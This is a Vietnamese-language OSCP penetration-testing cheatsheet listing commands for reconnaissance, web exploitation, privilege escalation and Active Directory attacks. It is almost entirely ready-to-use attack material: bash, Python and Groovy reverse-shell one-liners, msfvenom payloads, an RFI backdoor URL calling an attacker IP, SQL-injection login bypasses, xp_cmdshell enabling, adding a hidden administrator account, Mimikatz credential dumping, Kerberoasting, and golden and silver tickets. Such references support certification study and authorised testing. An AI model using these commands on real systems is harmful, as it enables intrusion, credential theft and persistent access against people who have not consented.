# OSCP Cheatsheet (Sổ tay Lệnh Thực chiến Pentest & OSCP)

> 🌐 **Ngôn ngữ:** [English](README.md) | **Tiếng Việt**

Tài liệu tra cứu lệnh thực chiến cho kiểm thử xâm nhập (Pentesting) & chứng chỉ OSCP: từ rà quét thu thập thông tin, khai thác ứng dụng Web, leo thang đặc quyền Windows/Linux cho tới tấn công Active Directory.

## Mục lục

- [Tổng quan & Thao tác cơ bản](#tổng-quan--thao-tác-cơ-bản)
  - [Đường dẫn hệ thống quan trọng](#đường-dẫn-hệ-thống-quan-trọng)
  - [Truyền tệp tin (File Transfers)](#truyền-tệp-tin-file-transfers)
  - [Tạo tài khoản người dùng](#tạo-tài-khoản-người-dùng)
  - [Phá mật khẩu & Hash](#phá-mật-khẩu--hash)
  - [Mimikatz](#mimikatz)
  - [Ligolo-ng (Tunneling / Pivoting)](#ligolo-ng-tunneling--pivoting)
- [Thu thập & Rà quét Dịch vụ (Recon & Enumeration)](#thu-thập--rà-quét-dịch-vụ-recon--enumeration)
  - [Quét cổng (Port Scanning)](#quét-cổng-port-scanning)
  - [Rà quét FTP](#rà-quét-ftp)
  - [Rà quét SSH](#rà-quét-ssh)
  - [Rà quét SMB](#rà-quét-smb)
  - [Rà quét HTTP/HTTPS](#rà-quét-httphttps)
  - [Rà quét DNS](#rà-quét-dns)
  - [Rà quét SMTP](#rà-quét-smtp)
  - [Rà quét LDAP](#rà-quét-ldap)
  - [Rà quét NFS](#rà-quét-nfs)
  - [Rà quét SNMP](#rà-quét-snmp)
  - [Rà quét RPC](#rà-quét-rpc)
- [Tấn công Ứng dụng Web](#tấn-công-ứng-dụng-web)
  - [Directory Traversal](#directory-traversal)
  - [Local File Inclusion (LFI) & RFI](#local-file-inclusion-lfi--rfi)
  - [SQL Injection (SQLi)](#sql-injection-sqli)
- [Khai thác & Reverse Shells](#khai-thác--reverse-shells)
  - [Msfvenom](#msfvenom)
  - [Reverse Shell một dòng (One Liners)](#reverse-shell-một-dòng-one-liners)
  - [Groovy Reverse Shell (Jenkins)](#groovy-reverse-shell-jenkins)
- [Leo thang Đặc quyền Windows (Windows Privilege Escalation)](#leo-thang-đặc-quyền-windows-windows-privilege-escalation)
  - [Kiểm tra Windows cơ bản](#kiểm-tra-windows-cơ-bản)
  - [Script rà quét tự động Windows](#script-rà-quét-tự-động-windows)
  - [Mạo danh Token (Token Impersonation)](#mạo-danh-token-token-impersonation)
  - [Lỗ hổng Services](#lỗ-hổng-services)
  - [DLL Hijacking & Autorun](#dll-hijacking--autorun)
  - [AlwaysInstallElevated & Scheduled Tasks](#alwaysinstallelevated--scheduled-tasks)
  - [Tìm kiếm Mật khẩu trên Windows](#tìm-kiếm-mật-khẩu-trên-windows)
- [Leo thang Đặc quyền Linux (Linux Privilege Escalation)](#leo-thang-đặc-quyền-linux-linux-privilege-escalation)
  - [Nâng cấp TTY Shell](#nâng-cấp-tty-shell)
  - [Kiểm tra Linux cơ bản](#kiểm-tra-linux-cơ-bản)
  - [Script rà quét tự động Linux](#script-rà-quét-tự-động-linux)
  - [Sudo / SUID / Capabilities & Cron](#sudo--suid--capabilities--cron)
  - [Chia sẻ NFS](#chia-sẻ-nfs)
- [Hậu khai thác (Post Exploitation)](#hậu-khai-thác-post-exploitation)
  - [Lịch sử PowerShell & Registry](#lịch-sử-powershell--registry)
  - [Tệp KDBX (KeePass) & Dump Hash](#tệp-kdbx-keepass--dump-hash)
- [Kiểm thử Active Directory](#kiểm-thử-active-directory)
  - [Thu thập thông tin AD (PowerView / BloodHound)](#thu-thập-thông-tin-ad-powerview--bloodhound)
  - [Tấn công xác thực AD (Spray / AS-REP / Kerberoasting / Silver Ticket)](#tấn-công-xác-thực-ad-spray--as-rep--kerberoasting--silver-ticket)
  - [Di chuyển ngang (Lateral Movement)](#di-chuyển-ngang-lateral-movement)
- [Tài liệu Pentest Bổ Sung](#tài-liệu-pentest-bổ-sung)
- [Credits & References (Nguồn tham khảo & Bản quyền)](#credits--references-nguồn-tham-khảo--bản-quyền)

---

## Tổng quan & Thao tác cơ bản

### Đường dẫn hệ thống quan trọng

- **Windows** (cấu hình, log, SAM/SYSTEM, Unattend):

```bash
C:/Users/Administrator/NTUser.dat
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/repair/SAM
C:/Windows/system32/config/regback/sam
C:/Windows/System32/drivers/etc/hosts
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/xampp/apache/conf/httpd.conf
C:/xampp/apache/logs/access.log
```

- **Linux** (tài khoản, SSH, dịch vụ web, tiến trình):

```bash
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/etc/exports
/etc/fstab
/etc/ssh/sshd_config
/proc/net/tcp
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
~/.bash_history
~/.ssh/id_rsa
~/.ssh/authorized_keys
```

### Truyền tệp tin (File Transfers)

- Tải file trên **Windows**:

```powershell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\temp\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```

- Tải file trên **Linux**:

```bash
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

- Truyền file từ **Windows sang Kali** qua SMB:

```bash
kali> impacket-smbserver -smb2support <sharename> .
win> copy file \\KaliIP\sharename
```

### Tạo tài khoản người dùng

```powershell
# Windows
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
```

```bash
# Linux
adduser <uname>
useradd -u <UID> -g <group> <uname>
```

### Phá mật khẩu & Hash

- Nhận diện loại hash: [tunnelsup.com/hash-analyzer](https://www.tunnelsup.com/hash-analyzer/)

```bash
# fcrackzip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip

# John the Ripper (https://github.com/openwall/john/tree/bleeding-jumbo/run)
ssh2john.py id_rsa > hash
john hashfile --wordlist=rockyou.txt

# Hashcat (https://hashcat.net/wiki/doku.php?id=example_hashes)
hashcat -m <number> hash wordlists.txt --force
```

### Mimikatz

```powershell
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch

# Chạy một dòng
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Ligolo-ng (Tunneling / Pivoting)

```bash
# Tạo card mạng ảo trên Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Máy tấn công (Kali)
./proxy -laddr <LHOST>:9001 -selfcert

# Máy mục tiêu (Windows / Linux)
./agent -connect <LHOST>:9001 -ignore-cert

# Trong console Ligolo-ng: chọn session -> xem ifconfig -> start
# Thêm route subnet nội bộ trên Kali
sudo ip r add <subnet> dev ligolo
```

---

## Thu thập & Rà quét Dịch vụ (Recon & Enumeration)

- **Passive Recon / OSINT:** `whois <domain>`, Google Dorks (`site:`, `filetype:`, `intitle:`, GHDB), tra cứu DNS tại [searchdns.netcraft.com](https://searchdns.netcraft.com), kiểm tra security headers tại [securityheaders.com](https://securityheaders.com/).

### Quét cổng (Port Scanning)

```bash
nmap -sC -sV <IP> -v
nmap -T4 -A -p- <IP> -v
sudo nmap -sV -p 443 --script "vuln" <IP>
locate .nse | grep <name>

# PowerShell kiểm tra cổng nội bộ
Test-NetConnection -Port <port> <IP>
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
```

### Rà quét FTP

```bash
ftp <IP>
nmap -p21 --script=ftp-anon <IP>
hydra -L users.txt -P passwords.txt <IP> ftp
```

### Rà quét SSH

```bash
ssh uname@IP
chmod 600 id_rsa && ssh uname@IP -i id_rsa
ssh2john id_rsa > hash && john --wordlist=/usr/share/wordlists/rockyou.txt hash
hydra -l uname -P passwords.txt <IP> ssh
```

### Rà quét SMB

```bash
sudo nbtscan -r 192.168.50.0/24
nmap -p445 --script="smb*" <IP>
smbclient -L //<IP>
smbclient //server/share -U <username>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
```

### Rà quét HTTP/HTTPS

```bash
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
nikto -h <url>

# WordPress / Drupal / Joomla
wpscan --url "target" --enumerate vp,u,vt,tt --verbose
droopescan scan drupal -u http://site
droopescan scan joomla --url http://site
```

### Rà quét DNS

```bash
host -t mx megacorpone.com
host -t txt megacorpone.com
dnsrecon -d megacorpone.com -t std
dnsenum megacorpone.com
nslookup -type=TXT info.megacorptwo.com <DNS_IP>
```

### Rà quét SMTP

```bash
nc -nv <IP> 25
smtp-user-enum -M VRFY -U username.txt -t <IP>
sudo swaks -t user1@test.com --from user3@test.com --server <mailserver-IP> --body @body.txt
```

### Rà quét LDAP

```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
python3 windapsearch.py --dc-ip <IP> -u <username> -p <password> --computers
```

### Rà quét NFS

```bash
nmap -sV --script=nfs-showmount <IP>
showmount -e <IP>
```

### Rà quét SNMP

```bash
snmpcheck -t <IP> -c public
snmpwalk -c public -v1 -t 10 <IP>
snmpenum -t <IP>
```

### Rà quét RPC

```bash
rpcclient -U="" <DCIP>
# Lệnh bên trong: srvinfo, enumdomusers, enumdomgroups, querydispinfo, netshareenum
```

---

## Tấn công Ứng dụng Web

- PHP Reverse Shell đa nền tảng tham khảo: [php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

### Directory Traversal

```bash
http://<target>/index.php?page=../../../../../../../../../etc/passwd
curl http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

- Tham khảo WordPress plugin shell: [leonjza/wordpress-shell](https://github.com/leonjza/wordpress-shell)

### Local File Inclusion (LFI) & RFI

```bash
# PHP wrappers
curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
curl http://<target>/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php

# Remote File Inclusion
http://<target>/index.php?page=http://<attacker-ip>/simple-backdoor.php&cmd=ls
```

### SQL Injection (SQLi)

```bash
# Bypass đăng nhập cơ bản
admin' or '1'='1
' or 1=1 --

# MSSQL xp_cmdshell với impacket
impacket-mssqlclient Administrator:Lab123@<IP> -windows-auth
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# SQLMap
sqlmap -u http://<IP>/blindsqli.php?user=1 -p user --dump
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

---

## Khai thác & Reverse Shells

### Msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

### Reverse Shell một dòng (One Liners)

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### Groovy Reverse Shell (Jenkins)

```java
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Leo thang Đặc quyền Windows (Windows Privilege Escalation)

### Kiểm tra Windows cơ bản

```powershell
whoami /priv
Start-Service <service>
Stop-Service <service>
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Script rà quét tự động Windows

- `winPEAS.exe` / `winPEAS.bat`, `Jaws-enum.ps1`, `PowerUp.ps1`, `PrivescCheck.ps1`

### Mạo danh Token (Token Impersonation)

```bash
PrintSpoofer.exe -i -c powershell.exe
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p "shell.exe" -a
```

### Lỗ hổng Services

```bash
# Unquoted Service Path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
icacls "<path>"
sc qc <servicename>
sc config <service> binpath="<path_to_shell>"
sc start <servicename>

# Registry Permissions
accesschk.exe /accepteula -uvwqk <registry_path>
reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

### DLL Hijacking & Autorun

```bash
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -wvu "<path>"
```

### AlwaysInstallElevated & Scheduled Tasks

```bash
# AlwaysInstallElevated (cả 2 key trả về 0x1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi
msiexec /quiet /qn /i reverse.msi

# Scheduled Tasks
schtasks /query /fo LIST /v
```

### Tìm kiếm Mật khẩu trên Windows

```powershell
findstr /si password *.txt *.xml *.ini *.config
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
cmdkey /list
runas /savecred /user:admin C:\Temp\reverse.exe

# Pass the Hash
pth-winexe -U DOMAIN/administrator%<LM>:<NT> //<IP> cmd.exe
```

---

## Leo thang Đặc quyền Linux (Linux Privilege Escalation)

### Nâng cấp TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/bash -i
```

### Kiểm tra Linux cơ bản

```bash
find / -writable -type d 2>/dev/null
cat /etc/fstab
lsblk
env
watch -n 1 "ps -aux | grep pass"
```

### Script rà quét tự động Linux

- `linPEAS.sh`, `LinEnum.sh`, `linuxprivchecker.py`, `pspy`

### Sudo / SUID / Capabilities & Cron

- Tra cứu binary leo thang đặc quyền: [gtfobins.github.io](https://gtfobins.github.io/)

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
crontab -l
```

### Chia sẻ NFS

```bash
# Kiểm tra tùy chọn no_root_squash
cat /etc/exports
showmount -e <target_IP>
mount -o rw <target_IP>:<share_location> /mnt/nfs
```

---

## Hậu khai thác (Post Exploitation)

### Lịch sử PowerShell & Registry

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
reg query HKCU /f password /t REG_SZ /s
```

### Tệp KDBX (KeePass) & Dump Hash

```powershell
Get-ChildItem -Recurse -Filter *.kdbx
keepass2john Database.kdbx > keepasshash
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash
```

- Tham khảo thêm về [Mimikatz](https://www.notion.so/Command-Cheatsheet-68d7f9b66a644a3988f256dcd73df00c?pvs=21)

---

## Kiểm thử Active Directory

### Thu thập thông tin AD (PowerView / BloodHound)

```powershell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired -verbose

# BloodHound
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location>
bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all
```

### Tấn công xác thực AD (Spray / AS-REP / Kerberoasting / Silver Ticket)

```bash
# Password Spraying
kerbrute passwordspray -d corp.com .\usernames.txt "pass"

# AS-REP Roasting
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request
.\Rubeus.exe asreproast /nowrap
hashcat -m 18200 hashes.txt wordlist.txt --force

# Kerberoasting
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.txt wordlist.txt --force

# Secretsdump
secretsdump.py <domain>/<user>:<password>@<IP>

# Silver Ticket (Mimikatz)
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
```

### Di chuyển ngang (Lateral Movement)

- CrackMapExec hiện được kế thừa bởi **NetExec (`nxc`)**: [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec).

```bash
# Impacket (psexec / smbexec / wmiexec / atexec)
psexec.py -hashes <LM>:<NT> <domain>/<user>@<IP> <command>
wmiexec.py <domain>/<user>:<password>@<IP>
winrs -r:<computername> -u:<user> -p:<password> "command"

# Pass the Ticket & Golden Ticket (Mimikatz)
kerberos::ptt <ticket.kirbi>
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM> /id:500
```

---

## Tài liệu Pentest Bổ Sung

- [HackTricks](https://book.hacktricks.wiki/) — Cẩm nang phương pháp luận pentest và rà quét từng dịch vụ chi tiết
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Kho payload tổng hợp cho Web, bypass bộ lọc và leo thang đặc quyền
- [LOLBAS Project](https://lolbas-project.github.io/) — Danh mục công cụ hệ thống Windows có sẵn dùng trong hậu khai thác
- [WADComs](https://wadcoms.github.io/) — Bảng tra cứu tương tác các lệnh tấn công Windows & Active Directory
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) — Công cụ pivoting qua giao diện TUN hiện đại thay thế SSHuttle/Chisel
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec) — Công cụ thay thế CrackMapExec kiểm thử Active Directory & SMB/WinRM

## Credits & References (Nguồn tham khảo & Bản quyền)

- **Kho gốc (Original Repository)**: [0xSojalSec/OSCP-Cheatsheet](https://github.com/0xSojalSec/OSCP-Cheatsheet) (tác giả ban đầu: Sai Sathvik)
- **Cập nhật & Việt hóa**: Sửa tiêu đề mục lục chuẩn GFM, thay thế liên kết CrackMapExec wiki hỏng bằng NetExec, bổ sung 6 tài liệu pentest mới (HackTricks, PayloadsAllTheThings, LOLBAS, WADComs, Ligolo-ng, NetExec) và biên dịch phiên bản tiếng Việt ([README.md](README.md)).
- **Giấy phép (License)**: Kho gốc không đính kèm tệp `LICENSE`; toàn bộ nguồn tham khảo và tác giả gốc được giữ nguyên ghi nhận tại đây.
